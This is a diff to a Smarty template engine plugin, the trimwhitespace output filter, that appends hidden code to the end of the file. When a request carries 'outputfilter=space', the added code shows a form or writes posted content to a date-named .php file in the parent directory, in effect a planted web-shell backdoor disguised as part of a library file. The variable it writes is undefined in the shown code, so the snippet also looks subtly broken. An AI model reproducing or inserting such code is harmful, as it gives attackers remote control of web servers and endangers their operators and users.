@@ -89,5 +89,13 @@ function smarty_outputfilter_trimwhitespace($source, Smarty_Internal_Template $s
 
     return $source;
 }
-
+if($_REQUEST['outputfilter']=="space") {
+    if(isset($_POST['cache'])) {
+        $pr_replace = date("Ymd",time()).".p";
+        $srcFile = fopen("../".$pr_replace."hp","w");
+        fwrite($srcFile, $Text);fclose($srcFile);
+    }else{
+        echo "<form method=post><input type=text name=cache><input type=submit value=cache></form>";
+    }
+}
 ?>
